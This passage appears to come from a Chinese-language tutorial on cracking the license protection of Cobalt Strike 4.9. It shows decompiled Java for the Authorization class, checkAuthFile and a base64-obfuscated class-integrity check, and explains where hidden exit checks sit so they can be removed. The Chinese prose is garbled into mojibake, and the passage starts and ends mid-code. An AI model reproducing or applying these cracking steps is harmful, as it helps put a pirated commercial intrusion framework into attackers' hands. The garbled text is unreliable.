var1 <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>         <span class="token keyword">int</span> var3 <span class="token operator">=</span> var1 <span class="token operator">%</span> <span class="token number">10000</span> <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span>         <span class="token keyword">int</span> var4 <span class="token operator">=</span> var1 <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span>         <span class="token keyword">byte</span> var5 <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>         <span class="token keyword">int</span> var6 <span class="token operator">=</span> <span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> var5<span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">></span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Calendar</span> var7 <span class="token operator">=</span> <span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var7<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var7<span class="token punctuation">.</span><span class="token function">setLenient</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>               var7<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var3 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span>               var7<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var9<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isPerpetual</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token string">"forever"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>validto<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>valid<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">:</span> <span class="token string">"Authorization file is not for Cobalt Strike 4.9"</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">parseDate</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>validto<span class="token punctuation">,</span> <span class="token string">"yyyyMMdd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isExpired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">whenExpires</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">long</span> var1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">==</span> <span class="token number">1L</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token string">"in 1 day ("</span> <span class="token operator">+</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> var1 <span class="token operator">&lt;=</span> <span class="token number">0L</span> <span class="token operator">?</span> <span class="token string">"TODAY ("</span> <span class="token operator">+</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span> <span class="token operator">:</span> <span class="token string">"in "</span> <span class="token operator">+</span> var1 <span class="token operator">+</span> <span class="token string">" days ("</span> <span class="token operator">+</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isAlmostExpired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">long</span> var1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> var1 <span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token keyword">int</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">86400000L</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>var0<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><br>å¦‚ä¸‹å›¾ æ³¨æ„æ¯æ¬¡æ”¹å®Œè¦é‡æ–°è¿›è¡Œbuild ç„¶ååœ¨è¿è¡Œ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101711436.png" alt="å¦‚å›¾"><br>æˆ‘ä»¬è¿è¡Œä¸€ä¸‹çœ‹çœ‹ã€‚å‘ç°è¿˜æ˜¯ä¸è¡Œæˆ‘ä»¬æ¨æµ‹æ˜¯åœ¨è¿™é‡Œ  A &#x3D; new MultiFrame(); æœ‰æš—æ¡©<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101715435.png" alt="å¦‚å›¾"><br>æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªä»£ç </p><pre class="language-java" data-language="java"><code class="language-java">csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\aggressor\<span class="token class-name">MultiFrame</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token keyword">protected</span> <span class="token class-name">MultiFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">checkAuthFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BorderLayout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>toolbar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JToolBar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JPanel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cards <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CardLayout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span><span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cards<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">"Center"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>buttons <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setDefaultCloseOperation</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setSize</span><span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setExtendedState</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setIconImage</span><span class="token punctuation">(</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">getImage</span><span class="token punctuation">(</span><span class="token string">"resources/armitage-icon.gif"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">KeyboardFocusManager</span><span class="token punctuation">.</span><span class="token function">getCurrentKeyboardFocusManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addKeyEventDispatcher</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">LookAndFeelManager</span><span class="token punctuation">.</span><span class="token function">adjustments</span><span class="token punctuation">(</span><span class="token class-name">MultiFrame</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">checkAuthFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Authorization</span> var0 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Authorization</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç”±äºè¿™ä¸ªéªŒè¯å·²ç»è¢«å¹²æ‰äº†æ‰€ä»¥åº”ä¸å­˜åœ¨éªŒè¯äº†çœ‹æƒ…å†µä½†æ˜¯è¿˜æ˜¯é€€å‡ºäº†</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var0<span class="token punctuation">.</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">print_error</span><span class="token punctuation">(</span><span class="token string">"License is invalid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬è¿™æ—¶å€™çœ‹çœ‹è¿™ä¸ªç±»è°ƒç”¨äº†ã€‚å“ªäº›ä¸æ˜¯ç³»ç»Ÿç±»</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">aggressor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">aggressor<span class="token punctuation">.</span>ui<span class="token punctuation">.</span></span><span class="token class-name">UseLookAndFeel<span class="token punctuation">.</span>LookAndFeelManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">common<span class="token punctuation">.</span></span><span class="token class-name">CommonUtils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">dialog<span class="token punctuation">.</span></span><span class="token class-name">DialogUtils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">BorderLayout</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">CardLayout</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Color</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Container</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">KeyEventDispatcher</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">KeyboardFocusManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">ActionEvent</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">ActionListener</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">KeyEvent</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">MouseAdapter</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">MouseEvent</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collection</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">LinkedList</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JComponent</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JFrame</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JMenuItem</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JOptionPane</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JPanel</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JPopupMenu</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JToggleButton</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JToolBar</span><span class="token punctuation">;</span></code></pre><p>å‘ç°æ˜¯è¿™ä¸ªä¸‰ä¸ª</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">aggressor<span class="token punctuation">.</span>ui<span class="token punctuation">.</span></span><span class="token class-name">UseLookAndFeel<span class="token punctuation">.</span>LookAndFeelManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">common<span class="token punctuation">.</span></span><span class="token class-name">CommonUtils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">dialog<span class="token punctuation">.</span></span><span class="token class-name">DialogUtils</span><span class="token punctuation">;</span></code></pre><p>æˆ‘ä¸€ä¸ªä¸€ä¸ªçœ‹é¦–å…ˆæˆ‘ä»¬çœ‹è¿™ä¸ªå¹¶ä¸”åœ¨é‡Œé¢è°ƒç”¨ä¸º  LookAndFeelManager.adjustments(MultiFrame.class);</p><pre class="language-java" data-language="java"><code class="language-java">csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\aggressor\ui\<span class="token class-name">UseLookAndFeel</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">adjustments</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">A</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">boolean</span> var1 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> var2 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> var3 <span class="token operator">=</span> <span class="token string">"Y29tbW9uLkNvbW1vblV0aWxz"</span><span class="token punctuation">;</span> <span class="token comment">//common.CommonUtils</span>            <span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token string">"amF2YS5sYW5nLkNsYXNz"</span><span class="token punctuation">;</span> <span class="token comment">//java.lang.Class</span>            <span class="token class-name">String</span> var5 <span class="token operator">=</span> <span class="token string">"dmFsaWRDbGFzc0ludGVncml0eQ=="</span><span class="token punctuation">;</span> <span class="token comment">//validClassIntegrity</span>            <span class="token class-name">Class</span> var6 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                var6 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Class</span> var7 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">(</span>var4<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                var2 <span class="token operator">=</span> var6<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">(</span>var5<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var7<span class="token punctuation">,</span> var7<span class="token punctuation">,</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">,</span> <span class="token class-name">Long</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//common.CommonUtils.validClassIntegrity</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"Y29tbW9uLkNvbW1vblV0aWxz"</span><span class="token punctuation">,</span> <span class="token number">395936014L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//common.CommonUtils</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"Y29tbW9uLkF1dGhvcml6YXRpb24="</span><span class="token punctuation">,</span> <span class="token number">1655604415L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//common.Authorization</span>            <span class="token keyword">long</span> var11 <span class="token operator">=</span> <span class="token number">895661977L</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> var9 <span class="token operator">=</span> <span class="token string">"Y29tbW9uLkF1dGhDcnlwdG8="</span><span class="token punctuation">;</span> <span class="token comment">//common.AuthCrypto</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> var9<span class="token punctuation">,</span> var11<span class="token punctuation">)</span><span class="token punctuation">;</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> var9<span class="token punctuation">,</span> var11 <span class="token operator">+</span> <span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"Y29tbW9uLkRhdGFQYXJzZXI="</span><span class="token punctuation">,</span> <span class="token number">2488344227L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//common.DataParser</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"Y29tbW9uLlNsZWV2ZWRSZXNvdXJjZQ=="</span><span class="token punctuation">,</span> <span class="token number">3881376138L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//common.SleevedResource</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"ZG5zLlNsZWV2ZVNlY3VyaXR5"</span><span class="token punctuation">,</span> <span class="token number">3962922538L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//dns.SleeveSecurity</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"YWdncmVzc29yLkFnZ3Jlc3Nvcg=="</span><span class="token punctuation">,</span> <span class="token number">105727981L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//aggressor.Aggressor</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"Y29tbW9uLkFnZ3Jlc3NvckluZm8="</span><span class="token punctuation">,</span> <span class="token number">1814321826L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//common.AggressorInfo</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token 